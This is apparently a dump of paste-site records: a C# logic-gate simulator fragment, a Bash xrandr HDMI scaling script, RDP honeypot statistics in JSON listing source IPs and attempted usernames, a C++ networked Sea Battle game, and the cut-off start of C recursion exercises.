                    if (matrixVoltage[0, i] == matrixVoltage[1, i] && matrixVoltage[0, i] == ""1"")
                    {
                        Console.Write(""1"");
                    }
                    else if (matrixVoltage[1, i] == ""E"" || matrixVoltage[0, i] == ""E"")
                    {
                        Console.Write(""E"");
                    }
                    else
                    {
                        Console.Write(0);
                    }
                }
            }

            else if (utasitas == ""OR"")
            {
                for (int i = 0; i < matrixVoltage.GetLength(1); i++)
                {
                    if (matrixVoltage[0, i] == ""1"" || matrixVoltage[1, i] == ""1"" && matrixVoltage[0, i] != ""E"" && matrixVoltage[1, i] != ""E"")
                    {
                        Console.Write(""1"");
                    }
                    else if (matrixVoltage[1, i] == ""E"" || matrixVoltage[0, i] == ""E"")
                    {
                        Console.Write(""E"");
                    }
                    else
                    {
                        Console.Write(0);
                    }
                }
            }
            
            else if (utasitas == ""NOT"")
            {
                for (int i = 0; i < matrixVoltage.GetLength(1); i++)
                {
                    if (matrixVoltage[0, i] == ""0"")
                    {
                        Console.Write(""1"");
                    }
                    else if (matrixVoltage[0, i] == ""1"")
                    {
                        Console.Write(""0"");
                    }
                    else
                    {
                        Console.Write(""E"");
                    }
                }
            }

            if (utasitas == ""NAND"")
            {
                for (int i = 0; i < matrixVoltage.GetLength(1); i++)
                {
                    if (matrixVoltage[0, i] == ""1"" && matrixVoltage[1, i] == ""1"")
                    {
                        Console.Write(""0"");
                    }
                    else if (matrixVoltage[1, i] == ""E"" || matrixVoltage[0, i] == ""E"")
                    {
                        Console.Write(""E"");
                    }
                    else
                    {
                        Console.Write(""1"");
                    }
                }
            }
            
            if (utasitas == ""NOR"")
            {
                for (int i = 0; i < matrixVoltage.GetLength(1); i++)
                {
                    if (matrixVoltage[0, i] == ""0"" && matrixVoltage[1, i] == ""0"")
                    {
                        Console.Write(""1"");
                    }
                    else if (matrixVoltage[1, i] == ""E"" || matrixVoltage[0, i] == ""E"")
                    {
                        Console.Write(""E"");
                    }
                    else
                    {
                        Console.Write(""0"");
                    }
                }
            }

            else if (utasitas == ""XOR"")
            {
                for (int i = 0; i < matrixVoltage.GetLength(1); i++)
                {
                    if (matrixVoltage[0, i] != matrixVoltage[1, i] && matrixVoltage[0, i] != ""E"" && matrixVoltage[1, i] != ""E"")
                    {
                        Console.Write(""1"");
                    }
                    else if (matrixVoltage[1, i] == ""E"" || matrixVoltage[0, i] == ""E"")
                    {
                        Console.Write(""E"");
                    }
                    else
                    {
                        Console.Write(0);
                    }
                }
            }
            
            else if (utasitas == ""XNOR"")
            {
                for (int i = 0; i < matrixVoltage.GetLength(1); i++)
                {
                    if (matrixVoltage[0, i] == matrixVoltage[1, i] && matrixVoltage[0, i] != ""E"" && matrixVoltage[1, i] != ""E"")
                    {
                        Console.Write(""1"");
                    }
                    else if (matrixVoltage[1, i] == ""E"" || matrixVoltage[0, i] == ""E"")
                    {
                        Console.Write(""E"");
                    }
                    else
                    {
                        Console.Write(0);
                    }
                }
            }
            #endregion Logikai Kapuk
        }
    }
}"
Gn4XeYDp,xrand escala...,Rnery,Bash,Thursday 9th of November 2023 06:18:57 PM CDT,"#!/usr/bin/env bash

find_hdmi_output() {
    local hdmi_output
    hdmi_output=$(xrandr | grep "" connected"" | grep ""HDMI"" | awk '{print $1}')
    echo ""$hdmi_output""
}

adjust_hdmi_scale() {
    local hdmi_output=""$1""
    local horizontal_scale=100
    local vertical_scale=100

    if [ -n ""$hdmi_output"" ]; then
        # Aplique as configurações de escala
        xrandr --output ""$hdmi_output"" --scale ${horizontal_scale}x${vertical_scale}
        # Se necessário, ajuste a posição da tela
        xrandr --output ""$hdmi_output"" --pos 0x0
        echo ""Escala ajustada para ${horizontal_scale}x${vertical_scale} na saída $hdmi_output""
    fi
    echo ""Nenhuma saída HDMI encontrada.""
}

main() {
    local hdmi_output
    hdmi_output=$(find_hdmi_output)
    adjust_hdmi_scale ""$hdmi_output""
}

main
"
0JiZUi4w,2023-11-09_stats.json,rdp_snitch,JSON,Thursday 9th of November 2023 06:18:14 PM CDT,"{
  ""ip"": {
    ""51.75.160.42"": 18,
    ""172.188.48.214"": 6,
    ""87.251.75.145"": 6,
    ""167.94.138.52"": 3,
    ""167.94.138.36"": 3,
    ""205.210.31.22"": 9,
    ""36.91.222.100"": 6,
    ""107.175.137.135"": 15,
    ""185.170.144.3"": 6,
    ""212.70.149.146"": 9,
    ""87.251.75.120"": 3,
    ""198.235.24.195"": 9,
    ""13.94.102.91"": 36,
    ""45.252.182.90"": 9,
    ""141.98.11.128"": 6,
    ""77.90.185.132"": 3,
    ""62.204.41.146"": 21,
    ""45.140.17.16"": 3,
    ""206.189.91.84"": 15,
    ""165.154.119.158"": 3,
    ""111.61.253.55"": 3,
    ""61.85.244.232"": 3,
    ""62.68.147.43"": 3,
    ""62.122.184.165"": 6,
    ""152.89.198.133"": 6,
    ""205.210.31.158"": 9,
    ""79.173.173.37"": 3,
    ""87.251.75.64"": 3,
    ""94.232.41.30"": 3,
    ""87.107.190.135"": 3,
    ""212.83.189.163"": 3,
    ""103.212.136.125"": 18,
    ""87.251.75.179"": 6,
    ""104.128.67.122"": 9,
    ""198.235.24.151"": 9,
    ""103.56.6.170"": 3,
    ""106.116.169.71"": 3
  },
  ""asn"": {
    ""AS16276"": 18,
    ""AS8075"": 42,
    ""AS208091"": 21,
    ""AS398324"": 6,
    ""AS396982"": 36,
    ""AS7713"": 6,
    ""AS36352"": 15,
    ""AS197414"": 6,
    ""AS204428"": 9,
    ""AS48011"": 9,
    ""AS209605"": 6,
    ""AS198465"": 3,
    ""AS59425"": 21,
    ""AS198953"": 3,
    ""AS14061"": 15,
    ""AS135377"": 3,
    ""AS24547"": 3,
    ""AS4766"": 3,
    ""AS25227"": 3,
    ""AS57523"": 12,
    ""AS5631"": 3,
    ""AS201634"": 3,
    ""AS12876"": 3,
    ""Unknown"": 18,
    ""AS396948"": 9,
    ""AS140599"": 3,
    ""AS4134"": 3
  },
  ""isp"": {
    ""OVH SAS"": 18,
    ""Microsoft"": 6,
    ""Xhost Internet Solutions LP"": 27,
    ""Censys, Inc."": 6,
    ""Google LLC"": 36,
    ""PT Telekomunikasi Indonesia"": 6,
    ""ColoCrossing"": 15,
    ""SS-Net"": 9,
    ""Microsoft Corporation"": 36,
    ""Turunc Smart Bilgisayar Teknoloji Ve Dis Ticaret Limited Sirketi"": 9,
    ""UAB Host Baltic"": 6,
    ""BtHoster LTD"": 3,
    ""Horizon LLC"": 21,
    ""Proton66 OOO"": 3,
    ""DigitalOcean, LLC"": 15,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""China Mobile communications corporation"": 3,
    ""Korea Telecom"": 3,
    ""AVANTEL"": 3,
    ""Chang Way Technologies Co. Limited"": 12,
    ""Luminet Data Limited"": 3,
    ""Mizban Dade Shetaban"": 3,
    ""Online"": 3,
    ""Gstech Software Systems Pvt Ltd"": 18,
    ""Kamatera"": 9,
    ""Comfac Corporation"": 3,
    ""Chinanet"": 3
  },
  ""org"": {
    ""OVH Ltd"": 18,
    ""Microsoft Azure Cloud (southeastasia)"": 6,
    ""Xhost Internet Solutions"": 18,
    ""Censys, Inc"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""Telekomunikasi Indonesia"": 6,
    ""New Wave NetConnect, LLC"": 15,
    ""Xhostis"": 6,
    ""4Media Ltd"": 9,
    ""Microsoft Azure Cloud (northeurope)"": 36,
    ""Turunc smart bilgisayar Teknoloji ve dis ticaret limited"": 9,
    ""Unknown"": 15,
    ""BtHoster LTD"": 3,
    ""Horizon LLC"": 21,
    ""Proton66 LLC"": 3,
    ""DigitalOcean, LLC"": 15,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""China Mobile"": 3,
    ""Kornet"": 3,
    ""Chang Way Technologies Co. Limited"": 6,
    ""Starcrecium Limited"": 6,
    ""Dmitriy Panchenko"": 3,
    ""Free SAS"": 3,
    ""Gstech Software Systems Pvt Ltd"": 18,
    ""Cloud Web Manage"": 9,
    ""Comfac Corporation"": 3,
    ""Chinanet HE"": 3
  },
  ""regionName"": {
    ""England"": 21,
    ""Central Singapore"": 21,
    ""North Holland"": 33,
    ""Michigan"": 6,
    ""California"": 60,
    ""Jakarta"": 6,
    ""Plovdiv"": 9,
    ""Leinster"": 36,
    ""Kaunas"": 6,
    ""Bavaria"": 3,
    ""Moscow"": 36,
    ""Bangkok"": 3,
    ""Hebei"": 6,
    ""Incheon"": 3,
    ""Moscow Oblast"": 3,
    ""Perm Krai"": 3,
    ""Zanjan"": 3,
    ""\u00cele-de-France"": 3,
    ""Uttar Pradesh"": 18,
    ""Metro Manila"": 3
  },
  ""country"": {
    ""United Kingdom"": 21,
    ""Singapore"": 21,
    ""Netherlands"": 33,
    ""United States"": 66,
    ""Indonesia"": 6,
    ""Bulgaria"": 9,
    ""Ireland"": 36,
    ""Lithuania"": 6,
    ""Germany"": 3,
    ""Russia"": 42,
    ""Thailand"": 3,
    ""China"": 6,
    ""South Korea"": 3,
    ""Iran"": 3,
    ""France"": 3,
    ""India"": 18,
    ""Philippines"": 3
  },
  ""account"": {
    ""Test"": 27,
    ""hello"": 117,
    ""Administr"": 33,
    ""(empty)"": 21,
    ""zurZJxKVY"": 3,
    ""ExwrFJ"": 3,
    ""nEgnPv"": 3,
    ""Domain"": 39,
    ""vxtZYyBUu"": 3,
    ""HnLIrb"": 3,
    ""zmMUGQ"": 3,
    ""Administrator"": 3,
    ""QfuonNj"": 3,
    ""HxwFCNxkv"": 3,
    ""jDgTKL"": 3,
    ""UPdyXB"": 3,
    ""nmap"": 3,
    ""gzljzZXOo"": 3,
    ""XloPTN"": 3,
    ""ntSvFe"": 3
  },
  ""keyboard"": {
    ""Unknown"": 282
  },
  ""client_build"": {
    ""Unknown"": 282
  },
  ""client_name"": {
    ""Unknown"": 282
  },
  ""ip_type"": {
    ""hosting"": 117,
    ""Unknown"": 123,
    ""proxy"": 9,
    ""hosting & proxy"": 18,
    ""mobile"": 15
  }
}"
pxXDHcdm,2023-11-09_stats.json,rdp_snitch,JSON,Thursday 9th of November 2023 06:16:10 PM CDT,"{
  ""ip"": {
    ""51.75.160.42"": 12,
    ""172.188.48.214"": 4,
    ""87.251.75.145"": 4,
    ""167.94.138.52"": 2,
    ""167.94.138.36"": 2,
    ""205.210.31.22"": 6,
    ""36.91.222.100"": 4,
    ""107.175.137.135"": 10,
    ""185.170.144.3"": 4,
    ""212.70.149.146"": 6,
    ""87.251.75.120"": 2,
    ""198.235.24.195"": 6,
    ""13.94.102.91"": 24,
    ""45.252.182.90"": 6,
    ""141.98.11.128"": 4,
    ""77.90.185.132"": 2,
    ""62.204.41.146"": 14,
    ""45.140.17.16"": 2,
    ""206.189.91.84"": 10,
    ""165.154.119.158"": 2,
    ""111.61.253.55"": 2,
    ""61.85.244.232"": 2,
    ""62.68.147.43"": 2,
    ""62.122.184.165"": 4,
    ""152.89.198.133"": 4,
    ""205.210.31.158"": 6,
    ""79.173.173.37"": 2,
    ""87.251.75.64"": 2,
    ""94.232.41.30"": 2,
    ""87.107.190.135"": 2,
    ""212.83.189.163"": 2,
    ""103.212.136.125"": 12,
    ""87.251.75.179"": 4,
    ""104.128.67.122"": 6,
    ""198.235.24.151"": 6,
    ""103.56.6.170"": 2,
    ""106.116.169.71"": 2
  },
  ""asn"": {
    ""AS16276"": 12,
    ""AS8075"": 28,
    ""AS208091"": 14,
    ""AS398324"": 4,
    ""AS396982"": 24,
    ""AS7713"": 4,
    ""AS36352"": 10,
    ""AS197414"": 4,
    ""AS204428"": 6,
    ""AS48011"": 6,
    ""AS209605"": 4,
    ""AS198465"": 2,
    ""AS59425"": 14,
    ""AS198953"": 2,
    ""AS14061"": 10,
    ""AS135377"": 2,
    ""AS24547"": 2,
    ""AS4766"": 2,
    ""AS25227"": 2,
    ""AS57523"": 8,
    ""AS5631"": 2,
    ""AS201634"": 2,
    ""AS12876"": 2,
    ""Unknown"": 12,
    ""AS396948"": 6,
    ""AS140599"": 2,
    ""AS4134"": 2
  },
  ""isp"": {
    ""OVH SAS"": 12,
    ""Microsoft"": 4,
    ""Xhost Internet Solutions LP"": 18,
    ""Censys, Inc."": 4,
    ""Google LLC"": 24,
    ""PT Telekomunikasi Indonesia"": 4,
    ""ColoCrossing"": 10,
    ""SS-Net"": 6,
    ""Microsoft Corporation"": 24,
    ""Turunc Smart Bilgisayar Teknoloji Ve Dis Ticaret Limited Sirketi"": 6,
    ""UAB Host Baltic"": 4,
    ""BtHoster LTD"": 2,
    ""Horizon LLC"": 14,
    ""Proton66 OOO"": 2,
    ""DigitalOcean, LLC"": 10,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""China Mobile communications corporation"": 2,
    ""Korea Telecom"": 2,
    ""AVANTEL"": 2,
    ""Chang Way Technologies Co. Limited"": 8,
    ""Luminet Data Limited"": 2,
    ""Mizban Dade Shetaban"": 2,
    ""Online"": 2,
    ""Gstech Software Systems Pvt Ltd"": 12,
    ""Kamatera"": 6,
    ""Comfac Corporation"": 2,
    ""Chinanet"": 2
  },
  ""org"": {
    ""OVH Ltd"": 12,
    ""Microsoft Azure Cloud (southeastasia)"": 4,
    ""Xhost Internet Solutions"": 12,
    ""Censys, Inc"": 4,
    ""Palo Alto Networks, Inc"": 24,
    ""Telekomunikasi Indonesia"": 4,
    ""New Wave NetConnect, LLC"": 10,
    ""Xhostis"": 4,
    ""4Media Ltd"": 6,
    ""Microsoft Azure Cloud (northeurope)"": 24,
    ""Turunc smart bilgisayar Teknoloji ve dis ticaret limited"": 6,
    ""Unknown"": 10,
    ""BtHoster LTD"": 2,
    ""Horizon LLC"": 14,
    ""Proton66 LLC"": 2,
    ""DigitalOcean, LLC"": 10,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""China Mobile"": 2,
    ""Kornet"": 2,
    ""Chang Way Technologies Co. Limited"": 4,
    ""Starcrecium Limited"": 4,
    ""Dmitriy Panchenko"": 2,
    ""Free SAS"": 2,
    ""Gstech Software Systems Pvt Ltd"": 12,
    ""Cloud Web Manage"": 6,
    ""Comfac Corporation"": 2,
    ""Chinanet HE"": 2
  },
  ""regionName"": {
    ""England"": 14,
    ""Central Singapore"": 14,
    ""North Holland"": 22,
    ""Michigan"": 4,
    ""California"": 40,
    ""Jakarta"": 4,
    ""Plovdiv"": 6,
    ""Leinster"": 24,
    ""Kaunas"": 4,
    ""Bavaria"": 2,
    ""Moscow"": 24,
    ""Bangkok"": 2,
    ""Hebei"": 4,
    ""Incheon"": 2,
    ""Moscow Oblast"": 2,
    ""Perm Krai"": 2,
    ""Zanjan"": 2,
    ""\u00cele-de-France"": 2,
    ""Uttar Pradesh"": 12,
    ""Metro Manila"": 2
  },
  ""country"": {
    ""United Kingdom"": 14,
    ""Singapore"": 14,
    ""Netherlands"": 22,
    ""United States"": 44,
    ""Indonesia"": 4,
    ""Bulgaria"": 6,
    ""Ireland"": 24,
    ""Lithuania"": 4,
    ""Germany"": 2,
    ""Russia"": 28,
    ""Thailand"": 2,
    ""China"": 4,
    ""South Korea"": 2,
    ""Iran"": 2,
    ""France"": 2,
    ""India"": 12,
    ""Philippines"": 2
  },
  ""account"": {
    ""Test"": 18,
    ""hello"": 78,
    ""Administr"": 22,
    ""(empty)"": 14,
    ""zurZJxKVY"": 2,
    ""ExwrFJ"": 2,
    ""nEgnPv"": 2,
    ""Domain"": 26,
    ""vxtZYyBUu"": 2,
    ""HnLIrb"": 2,
    ""zmMUGQ"": 2,
    ""Administrator"": 2,
    ""QfuonNj"": 2,
    ""HxwFCNxkv"": 2,
    ""jDgTKL"": 2,
    ""UPdyXB"": 2,
    ""nmap"": 2,
    ""gzljzZXOo"": 2,
    ""XloPTN"": 2,
    ""ntSvFe"": 2
  },
  ""keyboard"": {
    ""Unknown"": 188
  },
  ""client_build"": {
    ""Unknown"": 188
  },
  ""client_name"": {
    ""Unknown"": 188
  },
  ""ip_type"": {
    ""hosting"": 78,
    ""Unknown"": 82,
    ""proxy"": 6,
    ""hosting & proxy"": 12,
    ""mobile"": 10
  }
}"
xU6C5gLJ,2023-11-09_stats.json,rdp_snitch,JSON,Thursday 9th of November 2023 06:15:08 PM CDT,"{
  ""ip"": {
    ""51.75.160.42"": 6,
    ""172.188.48.214"": 2,
    ""87.251.75.145"": 2,
    ""167.94.138.52"": 1,
    ""167.94.138.36"": 1,
    ""205.210.31.22"": 3,
    ""36.91.222.100"": 2,
    ""107.175.137.135"": 5,
    ""185.170.144.3"": 2,
    ""212.70.149.146"": 3,
    ""87.251.75.120"": 1,
    ""198.235.24.195"": 3,
    ""13.94.102.91"": 12,
    ""45.252.182.90"": 3,
    ""141.98.11.128"": 2,
    ""77.90.185.132"": 1,
    ""62.204.41.146"": 7,
    ""45.140.17.16"": 1,
    ""206.189.91.84"": 5,
    ""165.154.119.158"": 1,
    ""111.61.253.55"": 1,
    ""61.85.244.232"": 1,
    ""62.68.147.43"": 1,
    ""62.122.184.165"": 2,
    ""152.89.198.133"": 2,
    ""205.210.31.158"": 3,
    ""79.173.173.37"": 1,
    ""87.251.75.64"": 1,
    ""94.232.41.30"": 1,
    ""87.107.190.135"": 1,
    ""212.83.189.163"": 1,
    ""103.212.136.125"": 6,
    ""87.251.75.179"": 2,
    ""104.128.67.122"": 3,
    ""198.235.24.151"": 3,
    ""103.56.6.170"": 1,
    ""106.116.169.71"": 1
  },
  ""asn"": {
    ""AS16276"": 6,
    ""AS8075"": 14,
    ""AS208091"": 7,
    ""AS398324"": 2,
    ""AS396982"": 12,
    ""AS7713"": 2,
    ""AS36352"": 5,
    ""AS197414"": 2,
    ""AS204428"": 3,
    ""AS48011"": 3,
    ""AS209605"": 2,
    ""AS198465"": 1,
    ""AS59425"": 7,
    ""AS198953"": 1,
    ""AS14061"": 5,
    ""AS135377"": 1,
    ""AS24547"": 1,
    ""AS4766"": 1,
    ""AS25227"": 1,
    ""AS57523"": 4,
    ""AS5631"": 1,
    ""AS201634"": 1,
    ""AS12876"": 1,
    ""Unknown"": 6,
    ""AS396948"": 3,
    ""AS140599"": 1,
    ""AS4134"": 1
  },
  ""isp"": {
    ""OVH SAS"": 6,
    ""Microsoft"": 2,
    ""Xhost Internet Solutions LP"": 9,
    ""Censys, Inc."": 2,
    ""Google LLC"": 12,
    ""PT Telekomunikasi Indonesia"": 2,
    ""ColoCrossing"": 5,
    ""SS-Net"": 3,
    ""Microsoft Corporation"": 12,
    ""Turunc Smart Bilgisayar Teknoloji Ve Dis Ticaret Limited Sirketi"": 3,
    ""UAB Host Baltic"": 2,
    ""BtHoster LTD"": 1,
    ""Horizon LLC"": 7,
    ""Proton66 OOO"": 1,
    ""DigitalOcean, LLC"": 5,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""China Mobile communications corporation"": 1,
    ""Korea Telecom"": 1,
    ""AVANTEL"": 1,
    ""Chang Way Technologies Co. Limited"": 4,
    ""Luminet Data Limited"": 1,
    ""Mizban Dade Shetaban"": 1,
    ""Online"": 1,
    ""Gstech Software Systems Pvt Ltd"": 6,
    ""Kamatera"": 3,
    ""Comfac Corporation"": 1,
    ""Chinanet"": 1
  },
  ""org"": {
    ""OVH Ltd"": 6,
    ""Microsoft Azure Cloud (southeastasia)"": 2,
    ""Xhost Internet Solutions"": 6,
    ""Censys, Inc"": 2,
    ""Palo Alto Networks, Inc"": 12,
    ""Telekomunikasi Indonesia"": 2,
    ""New Wave NetConnect, LLC"": 5,
    ""Xhostis"": 2,
    ""4Media Ltd"": 3,
    ""Microsoft Azure Cloud (northeurope)"": 12,
    ""Turunc smart bilgisayar Teknoloji ve dis ticaret limited"": 3,
    ""Unknown"": 5,
    ""BtHoster LTD"": 1,
    ""Horizon LLC"": 7,
    ""Proton66 LLC"": 1,
    ""DigitalOcean, LLC"": 5,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""China Mobile"": 1,
    ""Kornet"": 1,
    ""Chang Way Technologies Co. Limited"": 2,
    ""Starcrecium Limited"": 2,
    ""Dmitriy Panchenko"": 1,
    ""Free SAS"": 1,
    ""Gstech Software Systems Pvt Ltd"": 6,
    ""Cloud Web Manage"": 3,
    ""Comfac Corporation"": 1,
    ""Chinanet HE"": 1
  },
  ""regionName"": {
    ""England"": 7,
    ""Central Singapore"": 7,
    ""North Holland"": 11,
    ""Michigan"": 2,
    ""California"": 20,
    ""Jakarta"": 2,
    ""Plovdiv"": 3,
    ""Leinster"": 12,
    ""Kaunas"": 2,
    ""Bavaria"": 1,
    ""Moscow"": 12,
    ""Bangkok"": 1,
    ""Hebei"": 2,
    ""Incheon"": 1,
    ""Moscow Oblast"": 1,
    ""Perm Krai"": 1,
    ""Zanjan"": 1,
    ""\u00cele-de-France"": 1,
    ""Uttar Pradesh"": 6,
    ""Metro Manila"": 1
  },
  ""country"": {
    ""United Kingdom"": 7,
    ""Singapore"": 7,
    ""Netherlands"": 11,
    ""United States"": 22,
    ""Indonesia"": 2,
    ""Bulgaria"": 3,
    ""Ireland"": 12,
    ""Lithuania"": 2,
    ""Germany"": 1,
    ""Russia"": 14,
    ""Thailand"": 1,
    ""China"": 2,
    ""South Korea"": 1,
    ""Iran"": 1,
    ""France"": 1,
    ""India"": 6,
    ""Philippines"": 1
  },
  ""account"": {
    ""Test"": 9,
    ""hello"": 39,
    ""Administr"": 11,
    ""(empty)"": 7,
    ""zurZJxKVY"": 1,
    ""ExwrFJ"": 1,
    ""nEgnPv"": 1,
    ""Domain"": 13,
    ""vxtZYyBUu"": 1,
    ""HnLIrb"": 1,
    ""zmMUGQ"": 1,
    ""Administrator"": 1,
    ""QfuonNj"": 1,
    ""HxwFCNxkv"": 1,
    ""jDgTKL"": 1,
    ""UPdyXB"": 1,
    ""nmap"": 1,
    ""gzljzZXOo"": 1,
    ""XloPTN"": 1,
    ""ntSvFe"": 1
  },
  ""keyboard"": {
    ""Unknown"": 94
  },
  ""client_build"": {
    ""Unknown"": 94
  },
  ""client_name"": {
    ""Unknown"": 94
  },
  ""ip_type"": {
    ""hosting"": 39,
    ""Unknown"": 41,
    ""proxy"": 3,
    ""hosting & proxy"": 6,
    ""mobile"": 5
  }
}"
ifbjvRHA,Untitled,savva_morozov,C++,Thursday 9th of November 2023 05:59:11 PM CDT,"#ifdef WIN32
#include <sdkddkver.h>
#endif

#include ""seabattle.h""

#include <atomic>
#include <boost/asio.hpp>
#include <boost/array.hpp>
#include <iostream>
#include <optional>
#include <string>
#include <thread>
#include <string_view>

namespace net = boost::asio;
using net::ip::tcp;
using namespace std::literals;

void PrintFieldPair(const SeabattleField& left, const SeabattleField& right) {
    auto left_pad = ""  ""s;
    auto delimeter = ""    ""s;
    std::cout << left_pad;
    SeabattleField::PrintDigitLine(std::cout);
    std::cout << delimeter;
    SeabattleField::PrintDigitLine(std::cout);
    std::cout << std::endl;
    for (size_t i = 0; i < SeabattleField::field_size; ++i) {
        std::cout << left_pad;
        left.PrintLine(std::cout, i);
        std::cout << delimeter;
        right.PrintLine(std::cout, i);
        std::cout << std::endl;
    }
    std::cout << left_pad;
    SeabattleField::PrintDigitLine(std::cout);
    std::cout << delimeter;
    SeabattleField::PrintDigitLine(std::cout);
    std::cout << std::endl;
}

template <size_t sz>
static std::optional<std::string> ReadExact(tcp::socket& socket) {
    boost::array<char, sz> buf;
    boost::system::error_code ec;

    net::read(socket, net::buffer(buf), net::transfer_exactly(sz), ec);

    if (ec) {
        return std::nullopt;
    }

    return {{buf.data(), sz}};
}

static bool WriteExact(tcp::socket& socket, std::string_view data) {
    boost::system::error_code ec;

    net::write(socket, net::buffer(data), net::transfer_exactly(data.size()), ec);

    return !ec;
}

class SeabattleAgent {
public:
    SeabattleAgent(const SeabattleField& field)
        : my_field_(field) {
    }

    void StartGame(tcp::socket& socket, bool my_initiative) {

        try {
            boost::system::error_code ec;
            net::streambuf stream_buf;

            PrintFields();

            while (!IsGameEnded()) {
                if (my_initiative) {
                    std::cout << ""Your turn: ""sv;
                    std::string move_str;
                    std::getline(std::cin, move_str);

                    std::optional<std::pair<int, int>> my_move = ParseMove(move_str);
                    size_t x = my_move.value().first;
                    size_t y = my_move.value().second;

                    SendMove(socket, move_str);
                    
                    SeabattleField::ShotResult shot_result = ReadResult(socket).value();

                    switch(shot_result)
                    {
                        case SeabattleField::ShotResult::MISS: 
                            other_field_.MarkMiss(x, y);
                            my_initiative = !my_initiative;
                            std::cout << ""Miss""sv << std::endl;
                            break;
                        case SeabattleField::ShotResult::HIT: 
                            other_field_.MarkHit(x, y);
                            std::cout << ""Hit""sv << std::endl;
                            break;
                        case SeabattleField::ShotResult::KILL:
                            other_field_.MarkKill(x, y);
                            std::cout << ""Kill""sv << std::endl;
                            break;
                    }

                } else if (!my_initiative) {
                    std::cout << ""Waiting for turn ...""sv << std::endl;
                    auto opponent_move = ReadMove(socket);
                    size_t x = opponent_move.value().first;
                    size_t y = opponent_move.value().second;

                    std::cout << ""Shot to ""sv << MoveToString(opponent_move.value()) << std::endl;

                    SeabattleField::ShotResult shot_result = my_field_.Shoot(x, y);

                    switch(shot_result)
                    {
                        case SeabattleField::ShotResult::MISS: 
                            my_field_.MarkMiss(x, y);
                            my_initiative = !my_initiative;
                            break;
                        case SeabattleField::ShotResult::HIT: 
                            my_field_.MarkHit(x, y);
                            break;
                        case SeabattleField::ShotResult::KILL: 
                            my_field_.MarkKill(x, y);
                            break;
                    }
                    SendResult(socket, shot_result);                    
                }
                PrintFields();
            }
        }  catch (std::exception& e) {
        std::cerr << e.what() << std::endl;
        }
    }

private:
    static std::optional<std::pair<int, int>> ParseMove(const std::string_view& sv) {
        if (sv.size() != 2) return std::nullopt;

        int p1 = sv[0] - 'A', p2 = sv[1] - '1';

        if (p1 < 0 || p1 > 8) return std::nullopt;
        if (p2 < 0 || p2 > 8) return std::nullopt;

        return {{p1, p2}};
    }

    static std::string MoveToString(std::pair<int, int> move) {
        char buff[] = {static_cast<char>(move.first) + 'A', static_cast<char>(move.second) + '1'};
        return {buff, 2};
    }

    void PrintFields() const {
        PrintFieldPair(my_field_, other_field_);
    }

    bool IsGameEnded() const {
        return my_field_.IsLoser() || other_field_.IsLoser();
    }

    std::optional<std::pair<int, int>> ReadMove(tcp::socket& socket) {
        boost::system::error_code ec;
        net::streambuf stream_buf;

        net::read_until(socket, stream_buf, '\n', ec);
        if (ec) {
            std::cout << ""Error reading data ReadMove""sv << std::endl;
        return std::nullopt;
        }

        std::string turn_data_str{std::istreambuf_iterator<char>(&stream_buf),
                                  std::istreambuf_iterator<char>()};

        return ParseMove(turn_data_str);
    }

    std::optional<SeabattleField::ShotResult> ReadResult(tcp::socket& socket) {
        boost::system::error_code ec;
        net::streambuf stream_buf;

        net::read_until(socket, stream_buf, '\n', ec);
        if (ec) {
            std::cout << ""Error reading data ReadResult""sv << std::endl;
        return std::nullopt;
        }

        std::string shot_result_str{std::istreambuf_iterator<char>(&stream_buf),
                                    std::istreambuf_iterator<char>()};

        return static_cast<SeabattleField::ShotResult>(shot_result_str[0]);
    }

    void SendResult(tcp::socket& socket, SeabattleField::ShotResult& shot_result) {
        boost::system::error_code ec;
        std::string s{static_cast<char>(shot_result)};
        s += ""\n""s;
        std::cout << s << std::endl;
        socket.write_some(net::buffer(s), ec);
        if (ec) {
            std::cout << ""Error sending data SendResult""sv << std::endl;
        return;
        }
    }

    void SendMove(tcp::socket& socket, std::string move_str) {
        boost::system::error_code ec;
        move_str += ""\n""s;
        socket.write_some(net::buffer(move_str), ec);
        if (ec) {
            std::cout << ""Error sending data SendMove""sv << std::endl;
        return;
        }
    }

private:
    SeabattleField my_field_;
    SeabattleField other_field_;
};

void StartServer(const SeabattleField& field, unsigned short port) {
    SeabattleAgent agent(field);

    try {
        boost::system::error_code ec;

        net::io_context io_context;

        // используем конструктор tcp::v4 по умолчанию для адреса 0.0.0.0
        tcp::acceptor acceptor(io_context, tcp::endpoint(tcp::v4(), port));
        std::cout << ""Waiting for connection...""sv << std::endl;

        tcp::socket socket{io_context};
        acceptor.accept(socket, ec);

        agent.StartGame(socket, false);

    } catch (std::exception& e) {
        std::cerr << e.what() << std::endl;
    }
};

void StartClient(const SeabattleField& field, const std::string& ip_str, unsigned short port) {
    SeabattleAgent agent(field);

    try {
        boost::system::error_code ec;

        net::io_context io_context;

        auto endpoint = tcp::endpoint(net::ip::make_address(ip_str, ec), port);

        tcp::socket socket{io_context};
        socket.connect(endpoint, ec);

        agent.StartGame(socket, true);

    } catch (std::exception& e) {
        std::cerr << e.what() << std::endl;
    }
};

int main(int argc, const char** argv) {
    if (argc != 3 && argc != 4) {
        std::cout << ""Usage: program <seed> [<ip>] <port>"" << std::endl;
        return 1;
    }

    std::mt19937 engine(std::stoi(argv[1]));
    SeabattleField fieldL = SeabattleField::GetRandomField(engine);

    if (argc == 3) {
        StartServer(fieldL, std::stoi(argv[2]));
    } else if (argc == 4) {
        StartClient(fieldL, argv[2], std::stoi(argv[3]));
    }
}
"
8Zgi2fhG,Esercizi programmazione 1 - rec,informaticage,C,Thursday 9th of November 2023 05:44:25 PM CDT,"#include <stdio.h>

int even(int n) {
  if (n == 0) return 1;
  if (n == 1) return 0;

  return even(n - 2);
}

int summation(int i, int n) {
  if (i == n) return 0;
  return i + summation(i + 1, n);
}

int product(int i, int n) {
  if (i == n) return 1;
  return (i + 1) * product(i + 1, n);
}

int pi(int i, int n) {
  if (i == n + 1) return 0;
  int sum = summation(0, i) * even(i);
  int prod = product(0, i) * (1 - even(i));

  return sum + prod + pi(i + 1, n);
}

int pi_iter(int n) {
  int tot = 0;
  for (int i = 1; i <= n; i++) {
    int sum = summation(0, i) * (i % 2 == 0);
